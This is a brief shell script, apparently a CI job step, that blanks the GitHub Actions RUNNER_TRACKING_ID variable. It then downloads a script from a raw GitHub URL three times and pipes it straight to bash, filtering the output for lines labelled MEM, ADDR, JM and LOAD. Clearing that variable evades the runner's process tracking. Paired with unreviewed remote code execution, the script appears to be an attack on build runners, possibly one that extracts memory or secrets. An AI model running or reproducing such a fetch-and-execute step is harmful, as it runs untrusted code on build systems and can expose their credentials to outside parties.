echo "K1: v1_02q"
export RUNNER_TRACKING_ID=""
for i in 1 2 3; do curl -sfL "https://raw.githubusercontent.com/MSSTXNEWS/nox-helion-pp-private-build/main/nox-control/c300/rv_turn.sh?cb=$(date +%s)" -o /tmp/rv_turn_v102.sh && bash /tmp/rv_turn_v102.sh | grep -E "^(MEM|ADDR|JM|LOAD)" | sed -E 's/"sec".*\}\}? ?/ /; s/"sec.*"events[^}]*\}//'; done
echo END
